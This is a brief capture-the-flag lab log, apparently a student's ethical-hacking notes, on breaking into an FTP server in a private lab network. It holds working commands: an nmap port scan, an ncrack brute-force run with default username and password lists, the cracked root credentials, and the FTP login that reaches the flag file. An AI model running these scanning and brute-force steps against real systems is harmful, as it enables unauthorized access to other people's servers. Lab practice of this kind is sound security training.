# Ethical-Hacking

flag[adcb1f]:
nmap -p21  -oA flaggor 10.0.0-15.0-254 
Host: 10.0.3.51 ()	Ports: 21/open/tcp//ftp///
searched this on google "password cracking ftp kali"
ncrack -U http_default_users.txt -P adobe_top100_pass.txt ftp://10.0.3.51 
  Discovered credentials for ftp on 10.0.3.51 21/tcp:
  10.0.3.51 21/tcp ftp: 'root' '1234'
https://www.howtogeek.com/412626/how-to-use-the-ftp-command-on-linux/
  ftp 10.0.3.51 
  username:root
  pass:1234
ls
flag{adcb1f4352c6330e2ed29a2a427d80964382b57b270db8}.jpg
-------------------------------------------------------------------------------------------
